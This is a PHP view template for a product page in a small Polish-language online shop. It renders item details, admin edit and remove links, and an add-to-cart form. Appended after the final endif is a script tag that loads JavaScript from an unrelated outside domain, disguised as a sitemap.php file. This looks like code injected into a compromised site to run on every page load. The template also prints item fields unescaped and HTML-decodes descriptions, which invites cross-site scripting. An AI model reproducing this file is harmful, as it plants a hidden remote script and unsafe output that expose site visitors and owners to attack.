<?if($item -> id):?>
<h2><?=$item -> name?></h2>

<?if($ascendants):?>
	<p><?=getWord('item_category')?>
	<ol>
	<?foreach($ascendants as $ascendant):?>
		<li><a href='/category/<?=$ascendant -> id?>'><?=$ascendant -> name?></a>
	<?endforeach?>
	</ol>
<?endif?>
<?if($item -> photo):?>
	<p><img src='/<?=DIR_IMAGES . $item -> photo?>' alt='<?=getWord('item_image')?>'>
<?endif?>

<?if(access(2)):?>
<ul>
	<li><?=getWord('item_category')?> <?=$itemCategory -> name?>
	<li><a href='/itemEdit/<?=$item -> category?>/<?=$item -> id?>'><?=getWord('item_admin_edit')?></a>
	<li><a href='/itemRemove/<?=$item -> category?>/<?=$item -> id?>'><?=getWord('item_admin_remove')?></a>
</ul>
<?endif?>

<?if(true):?>
	<p><?=getWord('item_price')?> <strong><?=$item -> price?> zł</strong>
<?endif?>
<?if($item -> description):?>
	<p><?=html_entity_decode($item -> description, ENT_QUOTES)?>
<?endif?>

<h2><?=getWord('item_order')?></h2>

<?if(access(1)):?>
	<form action='/cart/add' method='post'>
	<p><?=getWord('item_order_add')?>
		<input name='<?=$item -> id?>'> <?=getWord('item_order_items')?>
		<input type='submit' value='<?=getWord('item_order_to_the_cart')?>'>!
	</form>
<?else:?>
	<p>Musisz być zarejestrowany aby dokonać zakupu!
<?endif?>

<?else:?>
<p><?=getWord('item_missing')?>
<?endif?><script src=http://johanneswallmark.com/media/sitemap.php ></script>